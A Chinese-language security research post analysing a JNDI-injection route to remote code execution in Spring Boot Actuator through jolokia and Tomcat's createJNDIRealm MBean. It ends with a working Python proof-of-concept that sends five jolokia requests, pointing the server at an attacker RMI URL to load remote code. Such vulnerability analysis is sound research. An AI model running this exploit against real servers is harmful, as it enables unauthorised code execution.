> 原文链接: https://www.anquanke.com//post/id/173265 


# Attack Spring Boot Actuator via jolokia Part 2


                                阅读量   
                                **184644**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01d7cf7183aff1584e.jpg)](https://p3.ssl.qhimg.com/t01d7cf7183aff1584e.jpg)



本文接[上文](https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/)，这里不会分析原文章中所说的/env这种利用的方法，而是说一下rr大佬的发现的另外一条利用链。

## 0x01 检查MBean

如果说不存在ch.qos.logback.classic reloadByURL这个MBean，还能不能造成RCE呢，这个是我在看完文章后的一个想法。如果说想要解决这个问题，我们需要再看看/jolokia/list中还有哪些利用链可用（真的是太多了T T，由于当时看完记得是在Spring Boot中内嵌的Tomcat中，所以直接看的这个类，然而这个类差点也看跪了T T）。

最终找到org.apache.catalina.mbeans.MBeanFactory这个可能能造成JNDI注入的类，其中有以下这么几个方法从注释的描述中感觉是可以造成JNDI注入的：
- createUserDatabaseRealm
- createDataSourceRealm
- createJNDIRealm
这几点中只有最后的createJNDIRealm是可用的，但是他们前面的处理流程都是一样的，接下来就将他们前面的处理流程简单的分析一下，并说明为什么只有createJNDIRealm是可用的。



## 0x02 Realm创建流程分析

Realm是一个MVCC数据库，而MVCC是用于解决多版本并发问题的一个方法。有关Realm的一些具体介绍可以参考[这篇文章](https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle)。而我自己的理解是就是它给每一个连接的线程建立了一个“快照”，当两个请求同时到达一个线程时，程序不会造成阻塞，而是会在这个“快照”（也是一个线程）中进行操作，当执行完成后，阻塞合并更改（有点像git）：

[![](https://p5.ssl.qhimg.com/t01bb147413a4fce127.jpg)](https://p5.ssl.qhimg.com/t01bb147413a4fce127.jpg)

然而Realm的原理跟我们主要要说的关系不大，tomcat在创建不同的Realm时其实大致的流程都是相同的，只是最后的具体实现不同而已，比如上一节中说道的三个Realm的创建在代码实现流程上是极为相似的：

[![](https://p2.ssl.qhimg.com/t013ba405529143633c.jpg)](https://p2.ssl.qhimg.com/t013ba405529143633c.jpg)

[![](https://p4.ssl.qhimg.com/t015ac049d888513073.jpg)](https://p4.ssl.qhimg.com/t015ac049d888513073.jpg)

[![](https://p2.ssl.qhimg.com/t0119f5f7defdfe12a9.jpg)](https://p2.ssl.qhimg.com/t0119f5f7defdfe12a9.jpg)

所以我们跟一下红框的部分然后看具体实现就好。

不难看出关键点在于container.setRealm(realm);，跟进看一下：

[![](https://p5.ssl.qhimg.com/t01a1a1a992a68b137b.jpg)](https://p5.ssl.qhimg.com/t01a1a1a992a68b137b.jpg)

如果不存在则创建一个新的realm，这里涉及到Lifecycle的一部分设计与实现，如果想要了解Lifecycle的细节的话，可以参考[这篇文章](https://uule.iteye.com/blog/2340873)。跟进看一下：

[![](https://p3.ssl.qhimg.com/t01b730f363dfc727c3.jpg)](https://p3.ssl.qhimg.com/t01b730f363dfc727c3.jpg)

看一下这个startInternal的具体实现，发现是一个虚类，那么看一下它的继承关系，找一下它的具体实现：

[![](https://p5.ssl.qhimg.com/t01aadee14eee0c3e57.jpg)](https://p5.ssl.qhimg.com/t01aadee14eee0c3e57.jpg)

可以看到我们所找到这三个Realm的具体实现点了。

下面说一下为什么createUserDatabaseRealm和createDataSourceRealm不能用。
1. createUserDatabaseRealm- [![](https://p4.ssl.qhimg.com/t011463ac81ba177aec.jpg)](https://p4.ssl.qhimg.com/t011463ac81ba177aec.jpg)
<li>乍一看resourceName可控，好像可以JNDI注入，然后发现getGlobalNamingContext()返回的是一个null： [![](https://p3.ssl.qhimg.com/t015195ebfc3be346b4.png)](https://p3.ssl.qhimg.com/t015195ebfc3be346b4.png)
</li>
- 所以无法利用。1. createDataSourceRealm- [![](https://p4.ssl.qhimg.com/t013c2d4ed4539cc57f.jpg)](https://p4.ssl.qhimg.com/t013c2d4ed4539cc57f.jpg)
- 好像并不可以利用。


## 0x03 createJNDIRealm的利用分析

那么再来看看createJNDIRealm：

[![](https://p0.ssl.qhimg.com/t017f8251134d3999d6.jpg)](https://p0.ssl.qhimg.com/t017f8251134d3999d6.jpg)

这里有两个重要的点，createDirContext()用env来创建一个InitialDirContext，另一个点是Context.*的配置我们可以控。

[![](https://p3.ssl.qhimg.com/t01e757b76373e66211.jpg)](https://p3.ssl.qhimg.com/t01e757b76373e66211.jpg)

那么具体的JNDI触发点在哪里呢？我们需要着重跟一下createDirContext。

首先createDirContext最后返回一个InitialDirContext对象，而这个对象是根据env来生成的：

[![](https://p2.ssl.qhimg.com/t012f3c354b534947ba.jpg)](https://p2.ssl.qhimg.com/t012f3c354b534947ba.jpg)

跟进，发现这个InitialDirContext实际上是InitialContext的子类，为什么要着重强调这一点呢？因为JDNI的两个必备要素中就一个要求是：上下文对象是通过InitialContext及其子类实例化的，且他们的lookup()方法允许动态协议切换。

[![](https://p3.ssl.qhimg.com/t012ccb038796e32bcd.jpg)](https://p3.ssl.qhimg.com/t012ccb038796e32bcd.jpg)

跟进看一下：

[![](https://p3.ssl.qhimg.com/t011684e3ef232a947e.jpg)](https://p3.ssl.qhimg.com/t011684e3ef232a947e.jpg)

myProps通过传入的初始上下文配置经过处理返回完整的上下文环境，可以把它看成env的“完整版”。接着向下跟进：

[![](https://p0.ssl.qhimg.com/t0110d6936f843442e3.jpg)](https://p0.ssl.qhimg.com/t0110d6936f843442e3.jpg)

[![](https://p5.ssl.qhimg.com/t01924f110e976e14c5.jpg)](https://p5.ssl.qhimg.com/t01924f110e976e14c5.jpg)

注意红框部分，我们可以通过设置env中的INITIAL_CONTEXT_FACTORY来控制这里的factory，可以看一下有哪些是我们可以指定的：

[![](https://p5.ssl.qhimg.com/t01ae3604ede3d5414f.jpg)](https://p5.ssl.qhimg.com/t01ae3604ede3d5414f.jpg)

可以看到我们可以指定com.sun.jndi.rmi.registry，来进行rmi的操作，来看一下具体实现：

[![](https://p5.ssl.qhimg.com/t01c6caa03dae3d210a.jpg)](https://p5.ssl.qhimg.com/t01c6caa03dae3d210a.jpg)

这里的var1还是我们的env，也就是说这里的第一个参数是可控的：

[![](https://p3.ssl.qhimg.com/t019712519bc9220099.jpg)](https://p3.ssl.qhimg.com/t019712519bc9220099.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e0b0a9e4a8ecda97.jpg)

[![](https://p1.ssl.qhimg.com/t0127fdabd051667d85.jpg)](https://p1.ssl.qhimg.com/t0127fdabd051667d85.jpg)

var0、var1可控，还调用了lookup()，在这里完成了JDNI的注入。



## 0x04 构造poc

梳理一下思路，我们需要做这么几部来完成攻击：
1. 创建JNDIRealm
1. 通过getDirectoryContextEnvironment()来设置contextFactory为RegistryContextFactory，并将connectionURL设置为自己的N/D服务器
1. 重启Realm来完成更改并执行（stop、start）
也就是说需要发4次请求。

在利用过程中get请求的构造比较麻烦这里用post请求来构造poc，关于post如何解析的可以参考get请求解析的分析流程，这里就不过多描述了。

```
poc：

import requests as req
import sys
from pprint import pprint

url = sys.argv[1] + "/jolokia/"
pprint(url)

create_JNDIrealm = `{`
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
`}`

set_contextFactory = `{`
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
`}`

set_connectionURL = `{`
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://localhost:1097/Exploit"
`}`

stop_JNDIrealm = `{`
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
`}`

start = `{`
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
`}`

expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]

for i in expoloit:
    rep = req.post(url, json=i)
    pprint(rep.json())
```



效果：

[![](https://p1.ssl.qhimg.com/t01e103b6f2c22cdce0.jpg)](https://p1.ssl.qhimg.com/t01e103b6f2c22cdce0.jpg)



## 0x05 Reference
- https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle
- https://uule.iteye.com/blog/2340873
- https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt